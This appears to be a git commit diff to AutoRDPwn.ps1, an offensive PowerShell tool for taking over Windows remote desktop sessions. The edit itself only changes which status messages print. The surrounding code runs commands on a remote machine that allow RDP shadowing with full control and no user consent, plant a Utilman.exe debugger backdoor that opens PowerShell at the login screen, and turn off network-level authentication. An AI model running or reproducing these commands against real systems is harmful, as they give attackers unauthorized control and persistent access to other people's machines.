0c70da70f7d441e32895f0a5ab9024cb998ff84e
JoelGMSec <34335312+JoelGMSec@users.noreply.github.com>
2020-03-19 10:55:23 +0100

    Update AutoRDPwn.ps1

--- AutoRDPwn.ps1
+++ AutoRDPwn.ps1
@@ -517,7 +517,7 @@ function Remove-Exclusions {
 
         'control*' { $control = "true" ; Write-Host
         invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
-        Write-Host "$using:txt31" -ForegroundColor Blue }}
+        if ($stickykeys){ Write-Host "$using:txt34" -ForegroundColor Blue } else { Write-Host "$using:txt31" -ForegroundColor Blue }}
 
         default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}} until ($input -in 'ver','see','controlar','control')
 
@@ -561,7 +561,7 @@ function Remove-Exclusions {
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
     powercfg /setacvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null ; powercfg /setdcvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null }}
 
-        if($version -Like '*Server*') { Write-Host "$version $txt34" -ForegroundColor Red ; if(!$stickykeys) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
+        if($version -Like '*Server*') { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$stickykeys) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } ; $Host.UI.RawUI.ForegroundColor = 'Green'
         do { Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
